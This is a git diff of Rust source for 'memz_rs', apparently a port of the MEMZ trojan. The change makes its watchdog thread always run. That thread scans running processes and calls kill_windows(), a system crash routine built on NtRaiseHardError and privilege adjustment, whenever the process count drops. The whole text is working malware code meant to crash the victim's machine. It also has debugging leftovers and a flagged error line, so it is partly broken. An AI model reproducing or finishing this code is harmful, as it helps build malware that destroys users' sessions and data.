@@ -3,7 +3,10 @@
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
     data::data::MSGS,
-    ntdll::{data::Privilege, library::Library, ntdll_api::{RtlAdjustPrivilegeFn, NtRaiseHardErrorFn}
+    ntdll::{
+        data::Privilege,
+        library::Library,
+        ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
     payloads::payloads::msg_box_hook,
     winapi_type::DWORD,
@@ -17,10 +20,11 @@ use memz_rs::{
 };
 use rand::Rng;
 use std::{
+    env::args,
     mem::size_of,
     ptr,
     thread::{self, sleep},
-    time::Duration, env::args,
+    time::Duration,
 };
 use windows::{
     core::PCSTR,
@@ -94,79 +98,69 @@ fn kill_windows_instant() -> Result<(), ()> {
         None => panic!("Failed GetProc NtRaiseHardError"),
     };
 
-    
-
     Ok(())
 }
 
 fn main() {
     let res = Resolution::new();
     // #[cfg(feature="CLEAN")]
-    let cmdline = args().collect::<Vec<String>>();
-    let argc = cmdline.len();
-    let arg = &cmdline[1];
+    let watchdog_thread = thread::spawn(move || -> Result<(), ()> {
+        let mut oproc = 0;
+        let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+        wrap_get_process_image_filename_a(&mut f_buf1)?;
 
-    if argc > 1 && lstrcmp_w(arg.as_str(), "/watchdog") {
-        let watchdog_thread = thread::spawn(move || -> Result<(), ()> {
-            let mut oproc = 0;
-            let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-            wrap_get_process_image_filename_a(&mut f_buf1)?;
+        sleep(Duration::from_millis(1000));
 
-            sleep(Duration::from_millis(1000));
+        loop {
+            let snapshot = wrap_create_toolhelp32_snapshot()?;
+            let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
+                dwSize: size_of::<PROCESSENTRY32> as u32,
+                ..Default::default()
+            };
+            dbg!(proc);
+            unsafe {
+                dbg!(Process32First(snapshot, &mut proc as *mut PROCESSENTRY32)); // <-- Error Line
+                
+            }
 
+            let mut nproc = 0;
             loop {
-                let snapshot = wrap_create_toolhelp32_snapshot()?;
-                dbg!(snapshot);
-                let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
-                    dwSize: size_of::<PROCESSENTRY32> as u32,
-                    ..Default::default()
-                };
-
+                let h_proc: Option<HANDLE>;
                 unsafe {
-                    Process32First(snapshot, &mut proc as *mut PROCESSENTRY32); // O
-                }
-
-                let mut nproc = 0;
-                loop {
-                    let h_proc: Option<HANDLE>;
-                    unsafe {
-                        h_proc = match OpenProcess(
-                            PROCESS_QUERY_INFORMATION,
-                            BOOL(0),
-                            proc.th32ProcessID,
-                        ) {
+                    h_proc =
+                        match OpenProcess(PROCESS_QUERY_INFORMATION, BOOL(0), proc.th32ProcessID) {
                             Ok(handle) => Some(handle),
                             Err(e) => {
-                                eprintln!("{e}");
+                                eprintln!("Error: {e}");
                                 None
                             }
                         };
-                    }
-                    let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-                    wrap_get_process_image_filename_a(&mut f_buf2)?;
-
-                    if f_buf1 != f_buf2 {
-                        nproc += 1;
-                    }
-
-                    wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
-                    drop(f_buf2);
-
-                    if wrap_process32_next(snapshot, &mut proc)? {
-                        break;
-                    }
+                        dbg!(h_proc);
                 }
-                wrap_close_handle(snapshot)?;
+                let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
+                wrap_get_process_image_filename_a(&mut f_buf2)?;
 
-                if nproc < oproc {
-                    kill_windows()?;
+                if f_buf1 != f_buf2 {
+                    nproc += 1;
                 }
 
-                oproc = nproc;
+                wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
+                drop(f_buf2);
 
-                sleep(Duration::from_millis(10));
+                if wrap_process32_next(snapshot, &mut proc)? {
+                    break;
+                }
             }
-        });
-        watchdog_thread.join().unwrap().unwrap();
-    }
+            wrap_close_handle(snapshot)?;
+
+            if nproc < oproc {
+                kill_windows()?;
+            }
+
+            oproc = nproc;
+
+            sleep(Duration::from_millis(10));
+        }
+    });
+    watchdog_thread.join().unwrap().unwrap();
 }
